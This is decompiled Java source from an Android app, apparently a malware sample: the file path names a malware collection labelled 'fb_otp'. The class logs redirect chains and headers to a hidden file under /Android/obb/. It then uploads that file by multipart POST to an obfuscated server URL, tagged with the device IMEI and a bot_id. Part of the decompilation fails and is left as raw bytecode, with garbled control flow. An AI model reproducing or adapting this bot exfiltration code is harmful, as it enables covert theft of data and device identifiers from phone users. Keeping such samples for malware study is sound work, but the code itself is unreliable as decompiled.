import android.content.Context;
import android.os.Environment;
import com.soft360.iService.AService;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;

final class ed
{
  InputStream jdField_a_of_type_JavaIoInputStream;
  String jdField_a_of_type_JavaLangString = "";
  StringBuffer jdField_a_of_type_JavaLangStringBuffer = new StringBuffer("");
  String b = "";
  String c = "";
  String d = "";
  
  public ed(dU paramdU, String paramString1, String paramString2)
  {
    this.d = paramString2;
    a(paramString1);
    paramdU = Environment.getExternalStorageDirectory().getAbsolutePath();
    paramString1 = new File(paramdU + "/Android/obb/");
    if (!paramString1.exists()) {
      paramString1.mkdirs();
    }
    paramString1 = new SimpleDateFormat("dd-MM-yyyy_HH-mm-ss").format(new Date());
    paramString1 = "/Android/obb/" + "url_" + paramString1 + ".txt";
    this.c = (paramdU + paramString1);
    paramdU = new File(this.c);
    try
    {
      paramdU = new FileWriter(paramdU);
      paramdU.write(this.jdField_a_of_type_JavaLangStringBuffer.toString());
      paramdU.flush();
      paramdU.close();
      paramdU = this.c;
      a();
    }
    catch (Exception paramdU)
    {
      for (;;)
      {
        try
        {
          new File(this.c).delete();
          return;
        }
        catch (Exception paramdU) {}
        paramdU = paramdU;
        paramdU.toString();
      }
    }
  }
  
  private void a()
  {
    localObject4 = dU.a(null);
    localObject3 = this.c;
    localObject1 = AService.jdField_a_of_type_AndroidContentContext.getString(2131165195);
    try
    {
      localObject2 = ((dU)localObject4).a;
      localObject2 = new String(cD.a((String)localObject1));
      localObject1 = localObject2;
    }
    catch (Exception localException2)
    {
      try
      {
        localObject1 = new FileInputStream(new File((String)localObject3));
        localObject4 = (HttpURLConnection)new URL((String)localObject2).openConnection();
        ((HttpURLConnection)localObject4).setDoInput(true);
        ((HttpURLConnection)localObject4).setDoOutput(true);
        ((HttpURLConnection)localObject4).setUseCaches(false);
        ((HttpURLConnection)localObject4).setRequestMethod("POST");
        ((HttpURLConnection)localObject4).setRequestProperty("Connection", "Keep-Alive");
        ((HttpURLConnection)localObject4).setRequestProperty("Content-Type", "multipart/form-data;boundary=" + "*****");
        ((HttpURLConnection)localObject4).setRequestProperty("imei", this.d);
        Object localObject2 = new DataOutputStream(((HttpURLConnection)localObject4).getOutputStream());
        ((DataOutputStream)localObject2).writeBytes("--" + "*****" + "\r\n");
        ((DataOutputStream)localObject2).writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\"" + (String)localObject3 + "\"" + "\r\n");
        ((DataOutputStream)localObject2).writeBytes("\r\n");
        int i = Math.min(((FileInputStream)localObject1).available(), 1048576);
        localObject3 = new byte[i];
        for (int j = ((FileInputStream)localObject1).read((byte[])localObject3, 0, i);; j = ((FileInputStream)localObject1).read((byte[])localObject3, 0, i))
        {
          if (j <= 0)
          {
            ((DataOutputStream)localObject2).writeBytes("\r\n");
            ((DataOutputStream)localObject2).writeBytes("--" + "*****" + "--" + "\r\n");
            i = ((HttpURLConnection)localObject4).getResponseCode();
            localObject3 = ((HttpURLConnection)localObject4).getResponseMessage();
            ((FileInputStream)localObject1).close();
            ((DataOutputStream)localObject2).flush();
            ((DataOutputStream)localObject2).close();
            new StringBuilder("upload ok ").append(i).append(" ").append((String)localObject3).toString();
            return;
            localException2 = localException2;
            localException2.printStackTrace();
            break;
          }
          localException2.write((byte[])localObject3, 0, i);
          i = Math.min(((FileInputStream)localObject1).available(), 1048576);
        }
        return;
      }
      catch (Exception localException1) {}
    }
    localObject2 = ((dU)localObject4).a(AService.jdField_a_of_type_Int) + (String)localObject1 + "?bot_id=" + ((dU)localObject4).b() + "&imei=" + this.d;
    new StringBuilder("start upload - ").append((String)localObject2).toString();
  }
  
  /* Error */
  private void a(String paramString)
  {
    // Byte code:
    //   0: aload_0
    //   1: getfield 34	ed:jdField_a_of_type_JavaLangStringBuffer	Ljava/lang/StringBuffer;
    //   4: ldc_w 263
    //   7: invokevirtual 266	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   10: pop
    //   11: aload_0
    //   12: getfield 34	ed:jdField_a_of_type_JavaLangStringBuffer	Ljava/lang/StringBuffer;
    //   15: new 54	java/lang/StringBuilder
    //   18: dup
    //   19: ldc_w 268
    //   22: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   25: aload_1
    //   26: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   29: ldc_w 270
    //   32: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   35: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   38: invokevirtual 266	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   41: pop
    //   42: new 272	org/apache/http/impl/client/DefaultHttpClient
    //   45: dup
    //   46: new 274	org/apache/http/params/BasicHttpParams
    //   49: dup
    //   50: invokespecial 275	org/apache/http/params/BasicHttpParams:<init>	()V
    //   53: invokespecial 278	org/apache/http/impl/client/DefaultHttpClient:<init>	(Lorg/apache/http/params/HttpParams;)V
    //   56: astore 5
    //   58: aload 5
    //   60: invokeinterface 284 1 0
    //   65: iconst_0
    //   66: invokestatic 290	org/apache/http/client/params/HttpClientParams:setRedirecting	(Lorg/apache/http/params/HttpParams;Z)V
    //   69: new 292	org/apache/http/client/methods/HttpGet
    //   72: dup
    //   73: aload_1
    //   74: invokespecial 293	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   77: astore 6
    //   79: aconst_null
    //   80: astore_1
    //   81: aload 5
    //   83: aload 6
    //   85: invokeinterface 297 2 0
    //   90: astore 5
    //   92: aload 5
    //   94: astore_1
    //   95: aload_1
    //   96: invokeinterface 303 1 0
    //   101: astore 5
    //   103: aload_1
    //   104: invokeinterface 307 1 0
    //   109: astore 6
    //   111: new 54	java/lang/StringBuilder
    //   114: dup
    //   115: ldc_w 309
    //   118: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   121: aload 6
    //   123: invokevirtual 310	java/lang/Object:toString	()Ljava/lang/String;
    //   126: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   129: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   132: pop
    //   133: aload_0
    //   134: getfield 34	ed:jdField_a_of_type_JavaLangStringBuffer	Ljava/lang/StringBuffer;
    //   137: new 54	java/lang/StringBuilder
    //   140: dup
    //   141: aload 6
    //   143: invokevirtual 310	java/lang/Object:toString	()Ljava/lang/String;
    //   146: invokestatic 60	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   149: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   152: ldc_w 270
    //   155: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   158: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   161: invokevirtual 266	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   164: pop
    //   165: aload_0
    //   166: ldc 23
    //   168: putfield 25	ed:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   171: iconst_0
    //   172: istore_2
    //   173: iconst_0
    //   174: istore_3
    //   175: iload_2
    //   176: aload 5
    //   178: arraylength
    //   179: if_icmplt +28 -> 207
    //   182: iload_3
    //   183: ifeq +235 -> 418
    //   186: return
    //   187: astore 5
    //   189: aload 5
    //   191: invokevirtual 311	org/apache/http/client/ClientProtocolException:printStackTrace	()V
    //   194: goto -99 -> 95
    //   197: astore 5
    //   199: aload 5
    //   201: invokevirtual 312	java/io/IOException:printStackTrace	()V
    //   204: goto -109 -> 95
    //   207: aload 5
    //   209: iload_2
    //   210: aaload
    //   211: astore 6
    //   213: aload 6
    //   215: invokeinterface 317 1 0
    //   220: astore 7
    //   222: aload 6
    //   224: invokeinterface 320 1 0
    //   229: astore 8
    //   231: new 54	java/lang/StringBuilder
    //   234: dup
    //   235: ldc_w 309
    //   238: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   241: aload 7
    //   243: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   246: ldc_w 322
    //   249: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   252: aload 8
    //   254: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   257: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   260: pop
    //   261: aload_0
    //   262: getfield 34	ed:jdField_a_of_type_JavaLangStringBuffer	Ljava/lang/StringBuffer;
    //   265: new 54	java/lang/StringBuilder
    //   268: dup
    //   269: aload 7
    //   271: invokestatic 60	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   274: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   277: ldc_w 322
    //   280: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   283: aload 8
    //   285: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   288: ldc_w 270
    //   291: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   294: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   297: invokevirtual 266	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   300: pop
    //   301: aload 7
    //   303: ldc_w 324
    //   306: invokevirtual 328	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   309: ifeq +69 -> 378
    //   312: aload_0
    //   313: aload 6
    //   315: invokeinterface 320 1 0
    //   320: putfield 25	ed:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   323: new 54	java/lang/StringBuilder
    //   326: dup
    //   327: ldc_w 330
    //   330: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   333: aload_0
    //   334: getfield 25	ed:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   337: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   340: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   343: pop
    //   344: aload_0
    //   345: getfield 34	ed:jdField_a_of_type_JavaLangStringBuffer	Ljava/lang/StringBuffer;
    //   348: new 54	java/lang/StringBuilder
    //   351: dup
    //   352: ldc_w 330
    //   355: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   358: aload_0
    //   359: getfield 25	ed:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   362: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   365: ldc_w 270
    //   368: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   371: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   374: invokevirtual 266	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   377: pop
    //   378: iload_3
    //   379: istore 4
    //   381: aload 7
    //   383: ldc -64
    //   385: invokevirtual 328	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   388: ifeq +20 -> 408
    //   391: iload_3
    //   392: istore 4
    //   394: aload 8
    //   396: ldc_w 332
    //   399: invokevirtual 336	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   402: ifeq +6 -> 408
    //   405: iconst_1
    //   406: istore 4
    //   408: iload_2
    //   409: iconst_1
    //   410: iadd
    //   411: istore_2
    //   412: iload 4
    //   414: istore_3
    //   415: goto -240 -> 175
    //   418: aload_0
    //   419: aload_1
    //   420: invokeinterface 340 1 0
    //   425: invokeinterface 346 1 0
    //   430: putfield 348	ed:jdField_a_of_type_JavaIoInputStream	Ljava/io/InputStream;
    //   433: new 350	java/io/BufferedReader
    //   436: dup
    //   437: new 352	java/io/InputStreamReader
    //   440: dup
    //   441: aload_0
    //   442: getfield 348	ed:jdField_a_of_type_JavaIoInputStream	Ljava/io/InputStream;
    //   445: invokespecial 355	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   448: invokespecial 358	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   451: astore 5
    //   453: new 54	java/lang/StringBuilder
    //   456: dup
    //   457: invokespecial 359	java/lang/StringBuilder:<init>	()V
    //   460: astore_1
    //   461: aload 5
    //   463: invokevirtual 362	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   466: astore 6
    //   468: aload 6
    //   470: ifnonnull +105 -> 575
    //   473: aload_0
    //   474: getfield 348	ed:jdField_a_of_type_JavaIoInputStream	Ljava/io/InputStream;
    //   477: invokevirtual 365	java/io/InputStream:close	()V
    //   480: aload_1
    //   481: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   484: astore_1
    //   485: new 54	java/lang/StringBuilder
    //   488: dup
    //   489: ldc_w 367
    //   492: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   495: aload_1
    //   496: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   499: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   502: pop
    //   503: aload_0
    //   504: getfield 34	ed:jdField_a_of_type_JavaLangStringBuffer	Ljava/lang/StringBuffer;
    //   507: new 54	java/lang/StringBuilder
    //   510: dup
    //   511: ldc_w 369
    //   514: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   517: aload_1
    //   518: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   521: ldc_w 270
    //   524: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   527: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   530: invokevirtual 266	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   533: pop
    //   534: aload_0
    //   535: getfield 25	ed:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   538: ldc 23
    //   540: if_acmpeq +65 -> 605
    //   543: aload_0
    //   544: aload_0
    //   545: getfield 25	ed:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   548: putfield 27	ed:b	Ljava/lang/String;
    //   551: aload_0
    //   552: getfield 25	ed:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   555: astore_1
    //   556: goto -556 -> 0
    //   559: astore_1
    //   560: aload_1
    //   561: invokevirtual 370	java/lang/IllegalStateException:printStackTrace	()V
    //   564: goto -131 -> 433
    //   567: astore_1
    //   568: aload_1
    //   569: invokevirtual 312	java/io/IOException:printStackTrace	()V
    //   572: goto -139 -> 433
    //   575: aload_1
    //   576: aload 6
    //   578: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   581: pop
    //   582: goto -121 -> 461
    //   585: astore 5
    //   587: aload 5
    //   589: invokevirtual 312	java/io/IOException:printStackTrace	()V
    //   592: goto -119 -> 473
    //   595: astore 5
    //   597: aload 5
    //   599: invokevirtual 312	java/io/IOException:printStackTrace	()V
    //   602: goto -122 -> 480
    //   605: aload_1
    //   606: ldc_w 372
    //   609: invokevirtual 376	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   612: ifeq -426 -> 186
    //   615: aload_1
    //   616: ldc_w 378
    //   619: invokevirtual 382	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   622: iconst_4
    //   623: iadd
    //   624: istore_2
    //   625: aload_1
    //   626: ldc_w 384
    //   629: invokevirtual 382	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   632: iconst_4
    //   633: iadd
    //   634: istore_3
    //   635: new 54	java/lang/StringBuilder
    //   638: dup
    //   639: ldc_w 330
    //   642: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   645: aload_0
    //   646: getfield 27	ed:b	Ljava/lang/String;
    //   649: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   652: aload_1
    //   653: iload_2
    //   654: iload_3
    //   655: invokevirtual 388	java/lang/String:substring	(II)Ljava/lang/String;
    //   658: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   661: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   664: pop
    //   665: aload_0
    //   666: getfield 34	ed:jdField_a_of_type_JavaLangStringBuffer	Ljava/lang/StringBuffer;
    //   669: new 54	java/lang/StringBuilder
    //   672: dup
    //   673: ldc_w 330
    //   676: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   679: aload_0
    //   680: getfield 27	ed:b	Ljava/lang/String;
    //   683: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   686: aload_1
    //   687: iload_2
    //   688: iload_3
    //   689: invokevirtual 388	java/lang/String:substring	(II)Ljava/lang/String;
    //   692: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   695: ldc_w 270
    //   698: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   701: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   704: invokevirtual 266	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   707: pop
    //   708: aload_0
    //   709: new 54	java/lang/StringBuilder
    //   712: dup
    //   713: aload_0
    //   714: getfield 27	ed:b	Ljava/lang/String;
    //   717: invokestatic 60	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   720: invokespecial 61	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   723: aload_1
    //   724: iload_2
    //   725: iload_3
    //   726: invokevirtual 388	java/lang/String:substring	(II)Ljava/lang/String;
    //   729: invokevirtual 67	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   732: invokevirtual 70	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   735: putfield 25	ed:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   738: aload_0
    //   739: getfield 25	ed:jdField_a_of_type_JavaLangString	Ljava/lang/String;
    //   742: astore_1
    //   743: goto -743 -> 0
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	746	0	this	ed
    //   0	746	1	paramString	String
    //   172	553	2	i	int
    //   174	552	3	j	int
    //   379	34	4	k	int
    //   56	121	5	localObject1	Object
    //   187	3	5	localClientProtocolException	org.apache.http.client.ClientProtocolException
    //   197	11	5	localIOException1	java.io.IOException
    //   451	11	5	localBufferedReader	java.io.BufferedReader
    //   585	3	5	localIOException2	java.io.IOException
    //   595	3	5	localIOException3	java.io.IOException
    //   77	500	6	localObject2	Object
    //   220	162	7	str1	String
    //   229	166	8	str2	String
    // Exception table:
    //   from	to	target	type
    //   81	92	187	org/apache/http/client/ClientProtocolException
    //   81	92	197	java/io/IOException
    //   418	433	559	java/lang/IllegalStateException
    //   418	433	567	java/io/IOException
    //   461	468	585	java/io/IOException
    //   575	582	585	java/io/IOException
    //   473	480	595	java/io/IOException
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/ed.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */